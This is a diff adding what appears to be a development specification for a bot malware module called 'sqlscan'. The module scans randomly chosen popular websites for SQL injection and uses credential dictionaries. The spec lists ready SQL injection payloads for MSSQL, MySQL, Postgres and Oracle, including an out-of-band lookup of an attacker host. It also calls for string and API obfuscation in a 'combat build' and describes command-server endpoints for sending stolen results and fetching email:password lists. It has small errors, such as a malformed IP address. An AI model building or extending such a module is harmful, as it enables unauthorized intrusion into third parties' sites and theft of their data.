@@ -1,0 +1,353 @@
+TASK FOR THE DEVELOPMENT OF A WEBSITE VULNERABILITY SCANNER
+
+
+OBJECTIVE
+
+A web site vulnerability scanner module should be written. The module should be designed according to the rules given in the modules_HOWTO document.
+
+
+PRINCIPLE OF WORK
+
+The scanner consists of two main parts:
+* crawler
+* detector
+
+The crawler generates URLs to be checked.
+The detector checks them.
+
+The result of checking a single site is the presence or absence of a vulnerability.
+If a vulnerability is found, it is accompanied by additional information:
+- the exact URL where the vulnerability was found
+- triggered scanner rule
+- the expected DBMS type (determined from the triggered rule)
+
+The result of the entire module is the list of vulnerabilities found in the process.
+
+
+REALIZATION
+
+0. Project name - sqlscan
+
+1. The scanner can and should work in several threads. The number of threads is set by a parameter in the config; if there is no such parameter, the compile time constant is used.
+There are two options for splitting into threads:
+1)
+- in the first group of threads the crawler works on different domains, generating a list for the detector
+- in the second group of threads the detector works by selecting records from the output list of the crawler for checking.
+2) in each thread both the crawler and the detector work simultaneously:
+- the crawler generates the domain to be checked and passes it to the detector
+- detector checks the domain and starts the crawler again.
+
+The second option looks simpler from the point of view of inter-thread synchronization.
+
+
+2. module initialization:
+Initialize the pseudorandom number generator.
+Randomness is of great importance in the algorithm.
+Initialization should be performed by the GetTickCount64() value.
+
+3. crawler algorithm:
+1) start from https://findsubdomains.com/world-top (this URL and its parsing rules are set in the config - TODO not yet described in the TOR)
+s3.amazonaws.com/alexa-static/top-1m.csv.zip
+2) select a random site from a list from 1 to 50000
+3) determine subdomains of this site, using DNS query
+4) parse the main page:
+- looking for links with dynamic pages (there is a GET request body: page.html?var=val&var1=val1...)
+- look for web forms with POST submission
+5) Parsing the robots.txt file. They may specify dynamic pages, asking not to index them.
+6) Make a list of URI-request parameters for the page.
+Separately mark those parameters that have:
+- numbers (including negative ones)
+- url-encoded values or plain text
+All parameters of the page URI-request are inherent properties of the page and are also passed to the output.
+However, further scanning is performed only on the marked parameters suitable for scanning.
+7) add the page with parameters to the output.
+
+4) Algorithm of the detector:
+1) We get the following URL from the output of the crawler
+2) Get the following rule from the list of rules
+3) Apply the rule to the page.
+3.1) If the rule worked, add the page, the triggered parameter, and the rule to the output. goto 1.
+3.2) If the rule did not work, goto 2.
+3.3) If there are no more rules, goto 1.
+
+
+5. The module sends the list of found vulnerabilities once every H minutes (set by compilation constant and config setting),
+provided that new passwords have been found since the previous sending.
+Logic of sending and protocol are described in the document "TOR of DPOST.txt password grab"
+Sending format: text divided into lines by \r\n characters.
+One line contains one record.
+The separator of record fields is the '|' symbol (vertical dash).
+Record format:
+
+url|param1|rule name1|param2|rule name2|...|paramN|rule nameN\r\n
+
+thus the number of records is floating.
+Here:
+url - the full URL of the site with the discovered vulnerability, INCLUDING ALL PARAMETERS (i.e. everything after the ? symbol in the URI - important information!)
+param - name of the parameter with the discovered vulnerability
+rule name - name of the rule for the discovered vulnerability.
+
+6. The module is formatted according to the module development rules (see modules_HOWTO.txt).
+
+7. The module sends the following events with the owa tag:
+- "Version build %DATE% %TIME%" (once at startup)
+- "Vulns sent to DPOST server" on successful sending of collected vulnerabilities
+- "Vulns send failure: servers unavailable" when there are no DPOST servers available.
+- "No vulns detected, give up" if the module is finished running and nothing is found (hypothetical case).
+In this case, the module should generate a WantRelease event (see "module_HOWTO") to unload from memory
+
+8. In this module you can use C++ STL (std::string, containers) in a limited way.
+   It is forbidden to use std::mutex and synchronization primitives - for this purpose you can use only
+   WinAPI synchronization primitives (CRITICAL_SECTION, etc.).
+
+9. Obfuscate strings with Andrivet library (attached, see _STR() macro).
+
+10. Obfuscate system calls with GetApi.h library. Be careful, obfuscation of system calls may cause crashes.
+
+11. The module must have two versions - x32- and x64-bit.
+
+12. In the combat build, lines should be obfuscated to the maximum and all debugging output should be disabled.
+
+13. The module must have a debug version. Debug output should be output to c:/temp/webscan.log (the path to the log is configurable in the macro).
+Each log entry must contain a timestamp accurate to the second.
+
+14. The project must have a config.h file (the name is not important, the essence is important - this is where all global settings - paths, macros-switches for conditional compilation, etc.).
+
+15. The module should work on all modern versions of Windows.
+    The minimum supported Windows version is Windows XP (if not possible - Windows Vista).
+
+16. The project must be designed for building in Microsoft Visual Studio not lower than 2015.
+
+17. The Visual Studio project must be configured as follows:
+* For ALL build profiles:
+- Output directory: $(SolutionDir)Bin\$(PlatformTarget)\$(Configuration)\.
+- Intermediate directory: $(SolutionDir)\obj\$(Platform)\$(Configuration)\$(ProjectName)\.
+- Multiprocessor Compilation: Yes
+* Release Profile:
+- Debugging Information Format (C/C++ code creation): no
+- Create debugging information (linker/debugging): no
+
+
+FUZZING RULES
+
+Fuzzing rules are divided into two types:
+- temporal: check vulnerability by the presence of a delay in HTTP response, when injecting code with the sleep command.
+- Difference: check vulnerability by the fact that there is no difference between a constant value of a parameter
+and the same value _calculated_ in the injected expression.
+
+Example of a temporal rule:
+  ?var=aaa@aaa.com';waitfor delay '00:00:10'--.
+will be executed with a delay of 10 seconds, and
+  ?var=aaa@aaa.com
+will execute without delay
+
+Example of a difference rule:
+  ?id=22
+и
+  ?id=23-1
+will produce the same page
+
+а
+  ?id=22
+и
+  ?id=23
+will produce different pages (the point of the second check is to make sure that changing the parameter at all in principle affects the output).
+
+In difference rules you should take into account that formally different results can be actually the same
+(for example, if a page has the current time output - the page has not changed, and formally the page a second ago is not equal to the page now).
+Perhaps, when checking whether the pages are identical, we need to consider the Levenshtein distance (though there are doubts here, since the Wagner-Fisher algorithm is memory-hungry).
+
+CONFIGS
+
+The name of the config is the Ctl argument of the Control function, the content of the config is the CtlArg argument (see modules_HOWTO.txt).
+
+All text in configs is case-sensitive; tags and service values must be lowercase.
+Configs must be in any single-byte encoding (preferably ASCII).
+XML comments are not allowed.
+
+
+* settings
+A config is a simple xml in the following format:
+
+  <scan>
+    <delay>delay between matching iterations, in milliseconds</delay>
+    <threads>number of matching threads</threads>
+    <start>URL of the start page from which to take the list of sites to check</start>
+    <regex>regular expression for searching domains on the start page</regex>
+  </scan>
+
+All parameters from this config are optional. If no parameter is specified, the compile time constant is used.
+
+* rules
+
+
+List of rules for testing:
+
+<rules>
+  <rule>.
+    <name>rule name</name>
+    <type>time|diff (one of these two values)</type>
+    <value1>value to be substituted into the parameter under test</value1>
+    <value2>value to be substituted into the parameter under test</value2>
+    <value3>value to be substituted into the parameter under test</value3>
+   </rule>
+   ...
+   <rule>
+     ...
+   </rule>
+</rules>
+
+Tag assignment:
+name - name of the rule; plays a role in the module output (indicates the type of vulnerability)
+type - one of two values type or diff - determines the type of rule (temporary or diff).
+value* - for temporary rules, this value should be substituted into the parameter under test.
+         If there are several tags with a value, they should be substituted one by one until success.
+         If the test is successful, the remaining values can be left unchecked.
+       - For difference rules:
+value1 - constant value: we will compare with the result of the output to this value
+value2 - computed equivalent: we will compare the result of output on this value with the result of output on value1.
+value3 - control value: we will compare the result of issuing on this value with the result of issuing on value1.
+Success is considered if the output for value1 and value2 is the same, and value1 and value3 are different.
+
+
+Initial variant of the config
+
+<rules>
+  <rule>
+    <name>MSSQL injection</name>
+    <type>time</type>
+    <value1>aaa@aaa.com';waitfor delay '00:00:10'--</value1>
+   </rule>
+  <rule>
+    <name>MySQL injection</name>
+    <type>time</type>
+    <value1>aaa@aaa.com';SELECT BENCHMARK(1000000,MD5('A'));--</value1>
+   </rule>
+  <rule>
+    <name>Postgres injection</name>
+    <type>time</type>
+    <value1>aaa@aaa.com';SELECT pg_sleep(10);--</value1>
+   </rule>
+  <rule>
+    <name>Oracle injection</name>
+    <type>time</type>
+    <value1>aaa@aaa.com';BEGIN DBMS_LOCK.SLEEP(5); END; --</value1>
+    <value2>aaa@aaa.com';SELECT UTL_INADDR.get_host_name('10.0.0.0.1') FROM dual; --</value2>
+    <value3>aaa@aaa.com';SELECT UTL_INADDR.get_host_address('blah.attacker.com') FROM dual; --</value3>
+    <value4>aaa@aaa.com';SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual; --</value4>
+   </rule>
+  <rule>
+    <name>Unescaped numeric</name>
+    <type>diff</type>
+    <value1>22</value1>
+    <value2>23-1</value2>
+    <value3>23</value3>
+   </rule>
+  <rule>
+    <name>Unescaped string</name>
+    <type>diff</type>
+    <value1>22</value1>
+    <value2>22' and '1' = '1</value2>
+    <value3>22' and '2'='1</value3>
+   </rule>
+</rules>
+
+
+SECOND VERSION
+
+In the second version, the module is controlled by requests to the command server rather than by input from configs.
+
+
+COMMAND SERVER AND CONFIGS
+
+Previously we received all input data in the form of configs from the bot backend.
+This is quite inconvenient for various reasons - backend restrictions on config sizes,
+limitations on operator control of the configs, lack of a common network status,
+lack of specialized storage for results.
+
+Instead, a command server will be used, from which we ask for configs and input lists,
+and to whom we give the loot.
+
+Because of this, all configs from the first version are abolished.
+There's a new srv config containing a list of control server addresses,
+separated by \r\n or \n, in address:port format.
+If the port is even, the operation is HTTP, if odd - HTTPS.
+If a protocol prefix is specified (http/https), the prefix takes precedence over the specified port.
+The module works with the control server that was reached first, for each request.
+
+The operating mode can be obtained by HTTP-request to the server
+
+GET /<group>/<clientid>/sql/mode HTTP/1.1
+Values group and clientid are struct ParentInfo fields
+ CHAR ParentID[256];
+ CHAR ParentGroup[64];
+(see module_HOWTO)
+
+The module expects a brute or check string in the body of the HTTP response.
+Any other value is invalid - in this case the module makes repeated requests every 5 minutes; until it receives a correct one.
+every 5 minutes; until a correct response is received, the module does not start its work.
+
+Number of scanning threads:
+GET /<group>/<clientid>/sql/th HTTP/1.1
+
+The response is a non-negative number.
+If atoi(response) == 0, then the default number of threads = std::thread_concurrency() - 1.
+
+The scanner gets the list of domains to check by HTTP request to the server
+
+GET /<group>/<clientid>/sql/domains HTTP/1.1
+Response format:
+address1[\r]\n
+domain2[\r]\n
+...
+(one or many entries)
+
+When the enumeration of the given list is completed, we let the server know about it:
+
+GET /<group>/<clientid>/sql/over HTTP/1.1
+
+The server's response is the same as to the /domains request - a new list of domains to work with.
+In case of an unexpected response (empty list, error code, etc.) the module goes to idle (scanning is stopped).
+and makes the same request once every 10 minutes (time is a constant).
+
+The dictionary for enumeration is obtained by HTTP-request to the control server:
+GET /<group>/<clientid>/sql/dict HTTP/1.1
+
+In response we receive the dictionary either as text/plain or application/gzip (look at the Content-Type response header).
+If the packing is gzip, then after unpacking we expect the same dictionary format as for plain text.
+Format:
+email:password[\r]\n
+
+The scanning rules are requested as follows:
+GET /<group>/<clientid>/sql/rules HTTP/1.1
+
+Response - text/plain or application/gzip (for now, limit ourselves to text/plain).
+
+Sending is done via DPOST protocol (see "DPOST password robbing TOR" for protocol description) with the following request
+
+ POST /<group>/<clientid>/sql/81 HTTP/1.1
+
+The collected data is sent in a multipart/form-data container with source and data fields.
+The value of the source field is "SQL Injections"
+Value of data field: plain text, line separator \r\n
+Record format:
+
+url|param1|rule name1|param2|rule name2|...|paramN|rule nameN\r\n
+...
+(one or many records)
+
+You can get the frequency of sending the dummy data from the control server by HTTP-request
+GET /<group>/<clientid>/sql/freq HTTP/1.1
+
+In the body of the response we expect a number - this is the number of seconds, not more often than which the data should be sent.
+If it is 0 - we send it as soon as a new result is ready.
+If it is a positive number - we accumulate records in the buffer and send once in X seconds,
+clearing the buffer on successful sending.
+
+At the end of the search through the list we let the server know about it:
+
+GET /<group>/<clientid>/sql/over HTTP/1.1
+
+The server's response is the same as to the /domains request - a new list of domains to work with.
+In case of an unexpected response (empty list, error code, etc.) the module goes to idle (scanning is stopped).
+and makes the same request once every 10 minutes (time is a constant).
